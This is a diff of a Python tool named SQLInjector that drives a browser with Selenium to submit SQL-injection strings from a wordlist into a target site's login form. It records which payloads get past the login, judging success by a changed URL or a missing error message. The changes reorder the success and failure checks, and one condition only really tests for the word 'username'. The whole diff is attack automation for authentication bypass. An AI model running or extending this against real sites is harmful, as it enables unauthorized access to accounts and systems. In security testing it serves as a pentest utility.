@@ -69,7 +69,7 @@ class SQLInjector:
            exit()
         self.setup_browser()
         self.test_sql_injection()
-    
+        self.Data_Analysis()
     def setup_browser(self):
         options = Options()
         if not self.args.live:
@@ -108,11 +108,12 @@ class SQLInjector:
         except KeyboardInterrupt:
                   exit()        
     def test_sql_injection(self):
+
         self.url_list = []
         self.payload_list = []
         if self.args.wordlist:
             try :
-                list_command  = open(self.args.wordlist,'r')   
+                list_command  = open(self.args.wordlist,'r',encoding = "ISO-8859-1")   
                 list_command  = list_command.readlines() 
             except FileNotFoundError as e:
                 print(R+"[+] Error     -------------|- "+Y+ f" {type(e).__name__}"+R+' ['+O+f"{self.args.wordlist}"+R+'] '+W) 
@@ -167,20 +168,12 @@ class SQLInjector:
                 pass_field.send_keys(Keys.RETURN) 
                 time.sleep(1)
                 page_source = self.driver.page_source
-                if self.args.error and self.args.error in str(page_source) or ("Error"or "error") in page_source\
-                or self.args.url == self.driver.current_url or ('username' or password) in page_source:
-                    print('\n\n')
-                    print(B+'\n[*]'+R+' SQL Injaction Command    : '+P, command +W)
-                    print(B+'[*]'+R+' Login Page  URL          : '+B, self.args.url+W )     
-                    if self.args.error:
-                        print(B+'[*]'+R+' Status                   : '+Y+self.args.error+W)
-                    else:               
-                        print(B+'[*]'+R+' Status                   : '+Y+' NOT LOGIN'+W) 
-                    for _ in range(7):
-                        sys.stdout.write('\x1b[1A')
-                        sys.stdout.write('\x1b[2K')    
-                else:
+                
+                if self.args.url != self.driver.current_url or self.args.error  and self.args.error not in str(page_source)\
+                and ('username' or 'password') not in page_source:
+
                     if self.args.username:
+
                         print(R+"|  "+Y+f"{self.args.username:<23}",R+"|"+P+f"{     command[0:20]   :<23}"+R+" | "+B+f"{' login ':<12}",R+"|",f'{str(self.driver.current_url):<80}',"|")
                         self.url_list.append(self.driver.current_url)
                         self.payload_list.append(command)
@@ -198,7 +191,19 @@ class SQLInjector:
                         self.payload_list.append(command)
 
                         if not self.args.Continue:
-                            self.Data_Analysis()
+                            self.Data_Analysis()  
+                elif self.args.error and self.args.error in str(page_source) or ("Error"or "error") in page_source\
+                or self.args.url == self.driver.current_url or ('username' or 'password') in page_source:
+                    print('\n\n')
+                    print(B+'\n[*]'+R+' SQL Injaction Command    : '+P, command +W)
+                    print(B+'[*]'+R+' Login Page  URL          : '+B, self.args.url+W )     
+                    if self.args.error:
+                        print(B+'[*]'+R+' Status                   : '+Y+self.args.error+W)
+                    else:               
+                        print(B+'[*]'+R+' Status                   : '+Y+' NOT LOGIN'+W) 
+                    for _ in range(7):
+                        sys.stdout.write('\x1b[1A')
+                        sys.stdout.write('\x1b[2K')           
             except Exception as e  :
                 print(B+"[+] Error          --------------|- "+O+  str(e)+W)
                 exit()
